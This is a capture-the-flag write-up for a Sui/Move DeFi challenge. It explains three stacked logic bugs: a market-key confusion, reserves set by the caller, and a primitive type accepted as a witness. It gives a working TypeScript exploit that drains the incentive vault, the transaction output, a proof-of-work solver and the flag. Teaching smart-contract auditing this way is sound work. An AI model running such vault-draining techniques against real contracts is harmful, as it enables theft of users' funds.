@@ -1,0 +1,330 @@
+---
+title: 'COMPFEST 18 - Compfest Coin'
+description: 'Stacking a Move market-key confusion, a caller-controlled price, and a primitive-type witness to drain an incentive vault on Sui'
+date: 2026-08-30
+tags: ['writeup', 'blockchain', 'move', 'sui', 'type-confusion', 'logic-flaw', 'compfest', '2026']
+authors: ['kudaliar']
+draft: false
+---
+
+A Sui / Move "DEX routing + incentive vault" protocol. The intended incentive payout is exactly `1`; the win needs `500`. Three stacked bugs turn that 1-token drip into a full 1000-token drain.
+
+## Challenge Description
+
+> ALL IN, HIGH-RISK, HIGH-REWARD.
+
+We are given the Move package and a launcher that spins up a private Sui network with the package pre-deployed. The win condition is flipping `Setup.solved` to `true`.
+
+The connection is a [TCP1P-CTF-Blockchain-Infra](https://github.com/TCP1P/TCP1P-CTF-Blockchain-Infra) launcher (Next.js frontend, gunicorn backend). Pulling the frontend chunk shows the whole API:
+
+```bash
+curl -s http://34.2.147.230:8501/_next/static/chunks/app/page-8419db4b143ac490.js \
+  | grep -oE 'fetch\([^)]{0,160}'
+```
+
+```text
+fetch("/data"
+fetch("/status",{method:"GET",credentials:"include"}
+fetch("/challenge",{method:"GET"}
+fetch("/solution",{method:"POST",...body:JSON.stringify({solution:h}
+fetch("/".concat(e     // e in {launch, kill, flag}
+```
+
+`/status` returns `401 Authentication required` until a proof-of-work is solved. `/challenge` hands out `s.AAAnEA==.Iqu+BxybLKgg5ZaZWUXzug==` — the classic **kCTF sloth PoW** (`s.<b64 difficulty>.<b64 seed>`, modulus `2^1279 - 1`, difficulty `0x2710 = 10000`).
+
+Solver — pure-Python takes ~75 s, `gmpy2` brings it to ~9 s:
+
+```python
+import base64, sys
+from gmpy2 import mpz, powmod
+VERSION, MODULUS = 's', mpz(2)**1279 - 1
+
+def decode_number(enc): return int.from_bytes(base64.b64decode(enc.encode()), 'big')
+def encode_number(num):
+    num = int(num); size = (num.bit_length() // 24) * 3 + 3
+    return base64.b64encode(num.to_bytes(size, 'big')).decode()
+
+def sloth_root(x, diff, p):
+    exponent, x = (p + 1) // 4, mpz(x)
+    for _ in range(diff):
+        x = powmod(x, exponent, p) ^ 1
+    return x
+
+def solve(chal):
+    d = chal.strip().split('.'); assert d[0] == VERSION
+    diff, x = map(decode_number, d[1:])
+    return VERSION + '.' + encode_number(sloth_root(x, diff, MODULUS))
+
+print(solve(sys.argv[1]))
+```
+
+`/launch` returns the RPC URL, a funded private key, and every object ID: `PACKAGE_ID`, the shared objects (`SETUP_ID` / `REGISTRY` / `VAULT` / `POOL` / `CONFIG` / `ORACLE`), and our owned `OperatorAccount<CFX>`. The description notes *"Sui CLI cannot be used to interact"*, so everything below goes through the `@mysten/sui` TypeScript SDK.
+
+## Initial Analysis
+
+`setup.move`:
+
+```move
+public entry fun solve(setup: &mut Setup, account: &vault::OperatorAccount<CFX>, config: &config::GlobalConfig) {
+    assert!(vault::is_qualified(account, config), ENotQualified);
+    setup.solved = true;
+}
+```
+
+`vault.move`:
+
+```move
+public fun is_qualified(account: &OperatorAccount<CFX>, config: &GlobalConfig): bool {
+    account.earned >= config::bounty_target(config)   // bounty_target = 500
+}
+```
+
+`earned` is written in exactly one place — `vault::claim_route_incentives`:
+
+```move
+public entry fun claim_route_incentives<Base, Quote, Strategy>(
+    vault, pool, strategy, position, account, oracle, config, ctx
+) {
+    let operator = tx_context::sender(ctx);
+    assert!(!table::contains(&vault.claimed, operator), EAlreadyClaimed);                    // (A) once per address
+    assert!(math::same_bytes(&vault.market, &pool::canonical_market(pool)), EWrongMarket);   // (B) market must match
+    assert!(math::same_bytes(&vault.market, registry::market(strategy)), EStrategyNotRegistered); // (C)
+    assert!(pool::position_pool(position) == object::id(pool), 9);                           // (D)
+    assert!(pool::effective_liquidity(pool, position) >= config::min_effective_liquidity(config), EInsufficientCfx); // (E) >= 500
+
+    let claim = pool::quoted_route_score(pool, oracle);
+    let amount = math::min(claim, vault.balance);      // vault.balance = 1000
+    vault.balance = vault.balance - amount;
+    account.earned = account.earned + amount;
+    table::add(&mut vault.claimed, operator, true);
+}
+```
+
+So we need **one** claim worth ≥ 500. The payout is:
+
+```move
+public fun quoted_route_score<Base, Quote>(pool: &RoutePool<Base, Quote>, oracle: &PriceOracle): u64 {
+    let raw = pool.reserve_quote / pool.reserve_base;
+    let oracle_price = oracle::price_e6(oracle);
+    if (raw > oracle_price) { raw } else { oracle_price }      // max(ratio, oracle)
+}
+```
+
+The seeded pool is `RoutePool<SUIX, USDC>` with `1_000_000 / 1_000_000`, and the oracle sits at `price = 1` with `admin = deployer` (`set_price` is properly gated, so no oracle manipulation). **The intended payout is `max(1, 1) = 1`.** We need 500. That is the whole challenge.
+
+## The Vulnerabilities
+
+Three bugs stack up. Individually each is survivable; together they turn a 1-token drip into a full 1000-token vault drain.
+
+### Bug 1 — market-key confusion: direct_market vs canonical_market
+
+`registry.move` maintains **two different string keys for the same logical market**:
+
+```move
+public fun canonical_market<A, B>(): vector<u8> {          // ORDER-INDEPENDENT: min|max
+    let left = type_bytes<A>();
+    let right = type_bytes<B>();
+    if (math::bytes_lt(&right, &left)) { math::join_key(right, left) }
+    else { math::join_key(left, right) }
+}
+
+public fun direct_market<A, B>(): vector<u8> {             // ORDER-DEPENDENT: A|B
+    math::join_key(type_bytes<A>(), type_bytes<B>())
+}
+```
+
+The registry is seeded with only the *direct* key of the canonical ordering:
+
+```move
+registry.listed_markets.push_back(direct_market<SUIX, USDC>());   // "…::SUIX|…::USDC"
+```
+
+and `pool::create_route_pool` deduplicates on the **direct** key:
+
+```move
+let direct = registry::direct_market<Base, Quote>();
+assert!(!registry::has_market(registry, &direct), EMarketAlreadyRegistered);   // <-- wrong key
+```
+
+…while the vault authorizes on the **canonical** key (check **(B)** above).
+
+`type_name::with_original_ids` renders `…::assets::SUIX` and `…::assets::USDC`; the shared prefix means the comparison lands on `'S' (0x53) < 'U' (0x55)`, so `SUIX < USDC` and the canonical key is always `SUIX|USDC`.
+
+Therefore instantiating the pool with the **reversed type order**:
+
+| | `<SUIX, USDC>` (seeded) | `<USDC, SUIX>` (ours) |
+|---|---|---|
+| `direct_market` | `SUIX\|USDC` — **listed** | `USDC\|SUIX` — **not listed** ✅ |
+| `canonical_market` | `SUIX\|USDC` | `SUIX\|USDC` — **matches `vault.market`** ✅ |
+
+We get to create a **second, fully attacker-parameterised pool for the exact same logical market** that the vault will happily accept. (`normalize_market` is called because `is_ordered<USDC, SUIX>()` is false, but it only re-adds the canonical key, which is already present — a no-op. It never notices the reversed duplicate.)
+
+### Bug 2 — the caller picks the price
+
+`create_route_pool` takes the reserves as **plain user input** with no economic backing, no coin transfer, and only an upper bound:
+
+```move
+assert!(reserve_base > 0 && reserve_quote > 0, EInvalidAmount);
+let cap = config::rebalance_cap(config);                 // 2_000_000
+assert!(reserve_base <= cap && reserve_quote <= cap, EPoolNotRebalanceable);
+```
+
+There is **no lower bound and no ratio sanity check**, and `quoted_route_score` is a raw integer division of those two numbers. Choosing `reserve_base = 1, reserve_quote = 2_000_000` gives:
+
+```text
+claim = max(2_000_000 / 1, oracle_price=1) = 2_000_000
+```
+
+`math::min(2_000_000, vault.balance = 1000)` = **1000**, i.e. the entire vault, 2× the target. The `rebalance_cap` guard is pure theatre: it caps the *numerator* but never the *ratio*, which is the value that actually feeds the payout.
+
+### Bug 3 — anything with drop is a valid witness
+
+The witness pattern is meant to prove "this call originated inside module *X*", because only a struct's defining module can construct it. Here it is defanged:
+
+```move
+public entry fun register_route_strategy<Base, Quote, Strategy: drop>(
+    registry: &mut RouteRegistry,
+    _witness: Strategy,        // taken by value, never validated
+    ctx: &mut TxContext,
+) {
+    let market = canonical_market<Base, Quote>();
+    let strategy_type = type_bytes<Strategy>();
+    assert!(!table::contains(&registry.strategies, strategy_type), EStrategyAlreadyRegistered);
+    table::add(&mut registry.strategies, strategy_type, market);
+    // …mints RouteStrategy<Strategy> { market: canonical_market<Base, Quote>(), … } to the sender
+}
+```
+
+`Strategy: drop` is satisfied by **primitive types**, and a primitive is a valid *pure* argument in a PTB. So `Strategy = u64` with the literal `0u64` as the "witness" mints a `RouteStrategy<u64>` whose `market` is whatever `<Base, Quote>` we ask for — we simply ask for `<SUIX, USDC>` and get an object that satisfies check **(C)**. No permission, no module, no cost. (`type_bytes<u64>()` is just `"u64"`, confirmed in the emitted event: `strategy_type: [117,54,52]`.)
+
+### Bonus — liquidity is free
+
+Check **(E)** demands `effective_liquidity >= 500`, but shares are minted from nothing:
+
+```move
+public entry fun add_liquidity<Base, Quote>(pool, position, shares: u64, config: &GlobalConfig) {
+    assert!(shares > 0, EInvalidAmount);
+    assert!(position.pool == object::id(pool), EWrongPosition);
+    let net_shares = math::apply_fee_floor(shares, config::liquidity_fee_bps(config));  // fee = 0
+    pool.lp_supply = pool.lp_supply + net_shares;
+    pool.accounted_liquidity = pool.accounted_liquidity + net_shares;
+    position.shares = position.shares + net_shares;
+}
+```
+
+No `Coin`, no `Balance`, no cap. `accounted_liquidity` and `lp_supply` are initialised equal and mutated identically everywhere, so `effective_liquidity = position.shares * accounted_liquidity / lp_supply == position.shares`. Requesting 500 shares costs nothing but gas and clears the gate exactly.
+
+## Exploitation
+
+```text
+create_route_pool<USDC, SUIX>(base=1, quote=2_000_000)   ── Bug 1 + 2 → attacker-priced pool, canonical market matches vault
+register_route_strategy<SUIX, USDC, u64>(0u64)           ── Bug 3     → RouteStrategy<u64> on the canonical market
+open_position<USDC, SUIX>(newPool)                       ──           → RoutePosition bound to the new pool
+add_liquidity(newPool, position, 500)                    ── Bonus     → effective_liquidity = 500  ✔ check (E)
+claim_route_incentives<USDC, SUIX, u64>(…)               ──           → min(2_000_000, 1000) = 1000 earned
+setup::solve(setup, account, config)                     ──           → 1000 >= 500  ✔  solved = true
+```
+
+Three transactions are needed, because `create_route_pool` **shares** the pool internally (it is not a PTB result, and a shared object created in a tx can't be consumed by that same tx), and `open_position` **transfers** the position to the sender. Steps 4–6 do fit in one PTB.
+
+```js
+import { SuiClient } from '@mysten/sui/client';
+import { Transaction } from '@mysten/sui/transactions';
+import { Ed25519Keypair } from '@mysten/sui/keypairs/ed25519';
+import { decodeSuiPrivateKey } from '@mysten/sui/cryptography';
+import fs from 'fs';
+
+const C = JSON.parse(fs.readFileSync(new URL('./creds.json', import.meta.url)));
+const client = new SuiClient({ url: C.RPC_URL });
+const kp = Ed25519Keypair.fromSecretKey(decodeSuiPrivateKey(C.PRIVKEY).secretKey);
+
+const P = C.PACKAGE_ID;
+const SUIX = `${P}::assets::SUIX`;
+const USDC = `${P}::assets::USDC`;
+
+async function run(tx, label) {
+  tx.setGasBudget(200_000_000);
+  const r = await client.signAndExecuteTransaction({ signer: kp, transaction: tx });
+  const res = await client.waitForTransaction({ digest: r.digest,
+    options: { showEffects: true, showObjectChanges: true, showEvents: true } });
+  console.log(`== ${label} == ${res.digest} -> ${res.effects.status.status}`);
+  if (res.effects.status.status !== 'success') { console.log(res.effects.status); process.exit(1); }
+  return res;
+}
+
+// TX1 — skewed pool on the reversed type order + a u64 "witness" strategy
+const tx1 = new Transaction();
+tx1.moveCall({
+  target: `${P}::pool::create_route_pool`,
+  typeArguments: [USDC, SUIX],                 // Bug 1: direct key USDC|SUIX is unlisted
+  arguments: [tx1.object(C.REGISTRY), tx1.object(C.CONFIG),
+              tx1.pure.u64(1), tx1.pure.u64(2_000_000)],   // Bug 2: ratio = 2_000_000
+});
+tx1.moveCall({
+  target: `${P}::registry::register_route_strategy`,
+  typeArguments: [SUIX, USDC, 'u64'],          // Bug 3: u64 has `drop`
+  arguments: [tx1.object(C.REGISTRY), tx1.pure.u64(0)],
+});
+const r1 = await run(tx1, 'create_route_pool + register_route_strategy');
+const newPool  = r1.objectChanges.find(o => o.type === 'created' && o.objectType.includes('::pool::RoutePool')).objectId;
+const strategy = r1.objectChanges.find(o => o.type === 'created' && o.objectType.includes('::registry::RouteStrategy')).objectId;
+
+// TX2 — position on the new pool (shared object from TX1 must be consumed in a later tx)
+const tx2 = new Transaction();
+tx2.moveCall({ target: `${P}::pool::open_position`, typeArguments: [USDC, SUIX],
+               arguments: [tx2.object(newPool)] });
+const r2 = await run(tx2, 'open_position');
+const position = r2.objectChanges.find(o => o.type === 'created' && o.objectType.includes('::pool::RoutePosition')).objectId;
+
+// TX3 — free shares, drain the vault, solve
+const tx3 = new Transaction();
+tx3.moveCall({ target: `${P}::pool::add_liquidity`, typeArguments: [USDC, SUIX],
+  arguments: [tx3.object(newPool), tx3.object(position), tx3.pure.u64(500), tx3.object(C.CONFIG)] });
+tx3.moveCall({ target: `${P}::vault::claim_route_incentives`, typeArguments: [USDC, SUIX, 'u64'],
+  arguments: [tx3.object(C.VAULT), tx3.object(newPool), tx3.object(strategy), tx3.object(position),
+              tx3.object(C.ACCOUNT), tx3.object(C.ORACLE), tx3.object(C.CONFIG)] });
+tx3.moveCall({ target: `${P}::setup::solve`,
+  arguments: [tx3.object(C.SETUP_ID), tx3.object(C.ACCOUNT), tx3.object(C.CONFIG)] });
+await run(tx3, 'add_liquidity + claim + solve');
+
+const setup = await client.getObject({ id: C.SETUP_ID, options: { showContent: true } });
+console.log('Setup:', JSON.stringify(setup.data.content.fields));
+```
+
+```text
+== create_route_pool + register_route_strategy == AWgtkNBDnaNWcJWfLfsVPFafP9osjHKPr8xuJav96nFj -> success
+  created …::registry::RouteStrategy<u64>  0x750c4f86…
+  created …::pool::RoutePool<…::USDC, …::SUIX>  0xbb26ad46… {"Shared":{"initial_shared_version":64}}
+  event  …::pool::RoutePoolCreated { reserve_base: "1", reserve_quote: "2000000" }
+  event  …::registry::StrategyRegistered { strategy_type: [117,54,52] }   // "u64"
+
+== open_position == B29PEBEsx6oFzBhezhS3uBSKyvd43LhE6uKgQCcVFQkt -> success
+  created …::pool::RoutePosition<…::USDC, …::SUIX>  0x73f659dc…
+
+== add_liquidity + claim_route_incentives + solve == 3mUcp6V7vKKo4nAiEkMeZ1XprgN6tBdvZaSRg5ExDhPk -> success
+  event  …::vault::IncentivesClaimed { amount: "1000", operator: "0x7e821dad…" }
+
+Setup: {"id":{"id":"0x10e7f8c9…"},"solved":true}
+```
+
+```bash
+curl -s -c cj -b cj http://34.2.147.230:8501/flag
+# {"flag":"COMPFEST18{Allow_me_to_say_goodbye_to_the_Crypto_World_…}","message":"Congratulations!","success":true}
+```
+
+## Other bugs in the codebase (unused)
+
+Found while auditing, not needed for the solve — but each is a genuine finding:
+
+- **`config::set_fees` is a public entry with no capability check.** Anyone can set `liquidity_fee_bps` / `withdraw_fee_bps` to arbitrary values, including `> 10000`, which makes `math::apply_fee_floor` underflow and abort — a free permanent DoS on `add_liquidity`.
+- **`vault::donate_to_vault` is unauthenticated** — anyone can inflate `vault.balance` for free. Harmless here only because `min(score, balance)` is bottlenecked by `score`.
+- **`pool::remove_liquidity` never decrements `position.shares`** — it burns `pool.lp_supply` and `pool.accounted_liquidity` but leaves the position untouched, so an LP keeps their claim forever after withdrawing.
+- **`vault::create_operator` ignores its `operator` argument** — the `OperatorAccount` records no owner at all, and since it has `store` it is freely transferable. Combined with the per-*sender* `claimed` table, "one claim per operator" is really "one claim per address", so 500 throwaway addresses claiming 1 each into the same account is a (slow, gas-expensive) alternative path to the same 500.
+- **`pool::effective_liquidity` can overflow** — `position.shares * pool.accounted_liquidity` is done in `u64` with no widening, so large-but-legitimate values abort instead of computing.
+- **`math::mul_div_floor` returns `0` on a zero denominator** instead of aborting — silently turning a division-by-zero bug into a wrong-but-plausible number.
+
+## Flag
+
+```text
+COMPFEST18{Allow_me_to_say_goodbye_to_the_Crypto_World_...as_a_human_who_has_learned}
+```
